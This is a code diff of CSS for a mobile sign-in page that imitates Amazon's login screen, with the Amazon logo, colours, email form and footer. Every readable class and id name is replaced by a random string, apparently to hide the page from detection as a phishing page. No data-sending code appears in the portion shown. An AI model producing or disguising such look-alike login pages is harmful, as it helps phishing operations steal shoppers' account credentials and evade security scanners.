@@ -11,12 +11,12 @@ body {
     min-height: 100vh;
 }
 
-.desktop-only { display: none !important; }
+.z9Kc1UtD { display: none !important; }
 
 a { color: #007185; text-decoration: none; }
 a:active, a:hover { color: #C7511F; text-decoration: underline; }
 
-.mobile-header-bg {
+.teG7EkS1 {
     background-color: #232f3e;
     height: 45px; 
     padding: 0 15px;
@@ -25,7 +25,7 @@ a:active, a:hover { color: #C7511F; text-decoration: underline; }
     width: 100%;
 }
 
-.amazon-logo-img-mobile {
+.UKKioexm {
     display: block;
     width: 90px;
     height: 27px;
@@ -35,14 +35,14 @@ a:active, a:hover { color: #C7511F; text-decoration: underline; }
     background-size: contain;
 }
 
-.amazon-logo-img {
+.eOvxvkYx {
     display: inline-block; width: 103px; height: 31px;
     background-image: url("https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg");
     background-repeat: no-repeat; background-position: center; background-size: contain;
     cursor: pointer; vertical-align: top;
 }
 
-.main-mobile {
+.RfRGfPaj {
     flex: 1;                       
     display: flex;
     justify-content: center;        
@@ -52,7 +52,7 @@ a:active, a:hover { color: #C7511F; text-decoration: underline; }
 }
 
 
-.login-card {
+.BP2EdMAZ {
     padding: 14px 12px; 
     background: #fff;
     width: 100%;
@@ -61,7 +61,7 @@ a:active, a:hover { color: #C7511F; text-decoration: underline; }
 }
 
 
-.mobile-welcome-title {
+.UCu45lOX {
     font-size: 22px;
     font-weight: 900;
     margin-bottom: 15px;
@@ -69,7 +69,7 @@ a:active, a:hover { color: #C7511F; text-decoration: underline; }
     text-align: left;
 }
 
-.mobile-radio-group{
+.K9SKF66r{
     display: flex;
     flex-direction: column;
     gap: 0;                       
@@ -79,17 +79,17 @@ a:active, a:hover { color: #C7511F; text-decoration: underline; }
     margin-bottom: 0;
 }
 
-.mobile-radio-group .inactive-option,
-.mobile-radio-group .active-option-header{
+.K9SKF66r .Hl5VOCvS,
+.K9SKF66r .JAWuB4bB{
     border: none;
     border-radius: 0;
     margin: 0;
 }
-.mobile-radio-group .radio-option + .radio-option{
+.K9SKF66r .A4Qyh5kL + .A4Qyh5kL{
     border-top: 1px solid #D5D9D9;
 }
 
-.inactive-option {
+.Hl5VOCvS {
     display: flex;
     align-items: flex-start;
     gap: 12px;
@@ -99,7 +99,7 @@ a:active, a:hover { color: #C7511F; text-decoration: underline; }
     position: relative;
 }
 
-.active-option-header {
+.JAWuB4bB {
     display: flex;
     align-items: flex-start;
     gap: 12px;
@@ -109,7 +109,7 @@ a:active, a:hover { color: #C7511F; text-decoration: underline; }
     z-index: 2;
 }
 
-.radio-visual {
+.sBgr5RTz {
     width: 20px;
     height: 20px;
     border: 1px solid #888;
@@ -120,13 +120,13 @@ a:active, a:hover { color: #C7511F; text-decoration: underline; }
     margin-left: 0;
 }
 
-.radio-visual.checked {
+.sBgr5RTz.szr5LusM {
     border: none;
     background: #1d66a1;
     position: relative;
 }
 
-.radio-visual.checked::after {
+.sBgr5RTz.szr5LusM::after {
     content: '';
     position: absolute;
     top: 50%; left: 50%;
@@ -137,20 +137,20 @@ a:active, a:hover { color: #C7511F; text-decoration: underline; }
     box-shadow: 0 0 0 1px #fff;
 }
 
-.option-text strong {
+.vND0hnoj strong {
     display: inline-block;
     font-size: 16px;
     font-weight: 700;
     color: #111;
     margin-right: 4px;
 }
-.option-text {
+.vND0hnoj {
     font-size: 15px;
     color: #111;
     line-height: 1.3;
 }
 
-#emailForm {
+#j4SMtqhz {
     background: #fff;
     border: 1px solid #D5D9D9;
     border-top: none;
@@ -160,7 +160,7 @@ a:active, a:hover { color: #C7511F; text-decoration: underline; }
     padding-left: 15px;
 }
 
-.form-label {
+.b26mbGIC {
     font-weight: 700;
     font-size: 15px;
     color: #111;
@@ -170,7 +170,7 @@ a:active, a:hover { color: #C7511F; text-decoration: underline; }
     line-height: 1.3;
 }
 
-.form-input {
+.y2xw0x4k {
     width: 100%;
     height: 40px;
     padding: 8px 10px;
@@ -182,13 +182,13 @@ a:active, a:hover { color: #C7511F; text-decoration: underline; }
     box-shadow: 0 1px 2px rgba(0,0,0,0.1) inset;
 }
 
-.form-input:focus {
+.y2xw0x4k:focus {
     border-color: #1e8aa5;
     box-shadow: 0 0 3px 2px rgba(255, 255, 255, 0.5);
     outline: none;
 }
 
-.submit-btn {
+.cU6sLDhx {
     width: 100%;
     height: 44px;
     background: #FFD814;
@@ -202,41 +202,41 @@ a:active, a:hover { color: #C7511F; text-decoration: underline; }
     cursor: pointer;
 }
 
-.legal-disclaimer {
+.ImHBO7uJ {
     font-size: 15.5px;
     line-height: 1.4;
     color: #111;
     margin-bottom: 20px;
 }
-.legal-disclaimer a { color: #2162A1; text-decoration: underline; }
+.ImHBO7uJ a { color: #2162A1; text-decoration: underline; }
 
-.help-section-link {
+.JWTde3j8 {
     font-size: 15.5px;
     color: #2162A1;
     text-decoration: none;
     margin-bottom: 25px;
     display: inline-block;
 }
-.help-section-link:hover { text-decoration: underline; color: #C7511F; }
+.JWTde3j8:hover { text-decoration: underline; color: #C7511F; }
 
-.mobile-business-section {
+.aYMeXmTH {
     border-top: 1px solid #b9b9b9;
     padding-top: 10px;
     margin-bottom: 15px;
 }
-.business-title-mobile {
+.SL4Dk13V {
     font-weight: 700;
     font-size: 15.5px;
     color: #111;
     display: block;
     margin-bottom: 4px;
 }
-.business-link-mobile {
+.Pf04uk05 {
     font-size: 15.5px;
     color: #2162A1;
 }
 
-.mobile-footer{
+.WAYNwfnW{
   background: #0c151f;
   padding: 30px 20px 50px;
   text-align: center;
@@ -246,7 +246,7 @@ a:active, a:hover { color: #C7511F; text-decoration: underline; }
   overflow: hidden;
 }
 
-.footer-region-selector{
+.jOPhXBUa{
   display: flex;
   justify-content: center;
   align-items: center;
@@ -257,7 +257,7 @@ a:active, a:hover { color: #C7511F; text-decoration: underline; }
   width: 100%;
 }
 
-.footer-region-selector span{
+.jOPhXBUa span{
   display: flex;
   align-items: center;
   gap: 8px;
@@ -265,7 +265,7 @@ a:active, a:hover { color: #C7511F; text-decoration: underline; }
   line-height: 1;
 }
 
-.footer-region-selector span:first-child::before{
+.jOPhXBUa span:first-child::before{
   content: "";
   display: block;
   width: 18px;
@@ -277,7 +277,7 @@ a:active, a:hover { color: #C7511F; text-decoration: underline; }
   transform: translateZ(0);
 }
 
-.footer-region-selector span:last-child::before{
+.jOPhXBUa span:last-child::before{
   content: "";
   display: block;
   width: 18px;
@@ -294,7 +294,7 @@ a:active, a:hover { color: #C7511F; text-decoration: underline; }
   backface-visibility: hidden;
 }
 
-.mobile-footer-links{
+.o8se7pLa{
   display: flex;
   flex-wrap: wrap;
   justify-content: center;
@@ -302,13 +302,13 @@ a:active, a:hover { color: #C7511F; text-decoration: underline; }
   margin-bottom: 16px;
 }
 
-.mobile-footer-links a{
+.o8se7pLa a{
   color: #DDD;
   font-size: 12px;
   text-decoration: none;
 }
 
-.mobile-footer-links a span{
+.o8se7pLa a span{
   display: inline-block;
   width: 28px;
   height: 14px;
@@ -324,18 +324,18 @@ a:active, a:hover { color: #C7511F; text-decoration: underline; }
   transform: translateZ(0);
 }
 
-.mobile-copyright{
+.qgKbHcLg{
   color: #ffffff;
   font-size: 11px;
   margin-top: 0;
 }
 
-.auth-error-box {
+.EelyGnpa {
     display: none; 
 }
 
 @media (max-width: 768px) {
-    .auth-error-box.show-error {
+    .EelyGnpa.QQrltBKo {
         display: block;
         width: auto;
         max-width: 560px;
@@ -353,7 +353,7 @@ a:active, a:hover { color: #C7511F; text-decoration: underline; }
         text-align: left;
     }
 
-    .auth-error-title {
+    .qw4NcyAX {
         color: #111;
         font-size: 17px;
         font-weight: 700; 
@@ -362,7 +362,7 @@ a:active, a:hover { color: #C7511F; text-decoration: underline; }
         font-family: 'Inter', Helvetica, Arial, sans-serif;
     }
 
-    .auth-error-message {
+    .XwSTfyKA {
         font-size: 15px;
         font-weight: 400;
         color: #111;
@@ -372,7 +372,7 @@ a:active, a:hover { color: #C7511F; text-decoration: underline; }
     }
 
     @media (max-width: 768px) {
-        .auth-email-missing-alert {
+        .LcbJ0vXN {
             display: none !important;
         }
     }
@@ -383,7 +383,7 @@ a:active, a:hover { color: #C7511F; text-decoration: underline; }
 @media (max-width: 768px){
 
   /* 1) El bloque de radios tendrá el borde completo y radios arriba */
-  .mobile-radio-group{
+  .K9SKF66r{
     border: 1px solid #D5D9D9;
     border-bottom: 0;                 /* clave: no dibujar el borde en la unión */
     border-radius: 8px 8px 0 0;
@@ -393,7 +393,7 @@ a:active, a:hover { color: #C7511F; text-decoration: underline; }
   }
 
   /* 2) El form tendrá el borde completo y radios abajo */
-  #emailForm{
+  #j4SMtqhz{
     border: 1px solid #D5D9D9;
     border-top: 0;                    /* clave: no dibujar el borde en la unión */
     border-radius: 0 0 8px 8px;
@@ -402,7 +402,7 @@ a:active, a:hover { color: #C7511F; text-decoration: underline; }
   }
 
   /* 3) Por si alguna clase mete sombra arriba */
-  #emailForm{
+  #j4SMtqhz{
     box-shadow: none;
   }
 }
